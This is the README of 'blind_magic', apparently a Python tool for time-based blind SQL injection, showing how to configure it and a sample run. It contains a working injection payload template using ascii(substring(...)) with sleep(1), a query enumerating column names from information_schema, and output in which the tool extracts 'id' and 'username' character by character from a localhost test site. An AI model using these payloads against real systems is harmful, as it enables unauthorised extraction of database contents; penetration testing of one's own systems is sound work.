# blind_magic 0.1.3  
Manual Blind SQL Injection  
  
Some trick:  
I supply to you 4 loop variables l1 to l4 {l1} {l2} {l3} {l4}  
  
Blind query statament:  
{CONDITION_QUERY}  
{QUERY}  
{OPERATOR}  
{CHAR}  
  
example:  
b = Blind_magic()  
b.set_l1(1,10)  
b.set_l2(0,1)  
b.url = "http://localhost/test_site/?q="  
b.base_query = "if(({CONDITION_QUERY}),sleep(1),NULL)"  
b.condition_query = "ascii(substring(({QUERY}),{l1},1)){OPERATOR}{CHAR}"  
b.query = "Select column_name from information_schema.columns where table_name='staffs' limit {l2},1"  
b.run()  
print b.result  
  
[START]: Welcome to Bl1nd_m4g1c  
[INFO]: Time-based mode selected, time delay for compare is 1s, please check your sleep/wait_for value  
[STATUS] l4 now:0/0  
[STATUS] l3 now:0/0  
[STATUS] l2 now:0/1  
[STATUS] l1 now:1/10  
[INFO]: Character founded:i  
[STATUS] l1 now:2/10  
[INFO]: Character founded:d  
[STATUS] l1 now:3/10  
[INFO]: End of string, l1 gonna be reset  
[OK]: New result is:id  
[STATUS] l2 now:1/1  
[STATUS] l1 now:1/10  
[INFO]: Character founded:u  
[STATUS] l1 now:2/10  
[INFO]: Character founded:s  
[STATUS] l1 now:3/10  
[INFO]: Character founded:e  
[STATUS] l1 now:4/10  
[INFO]: Character founded:r  
[STATUS] l1 now:5/10  
[INFO]: Character founded:n  
[STATUS] l1 now:6/10  
[INFO]: Character founded:a  
[STATUS] l1 now:7/10  
[INFO]: Character founded:m  
[STATUS] l1 now:8/10  
[INFO]: Character founded:e  
[STATUS] l1 now:9/10  
[INFO]: End of string, l1 gonna be reset  
[OK]: New result is:username  
[FINISH]: Total time:105s  
[FINISH]: Bl1nd_m4g1c has done her job, go http://github.com/truongtn/blind_magic  
['id', 'username']  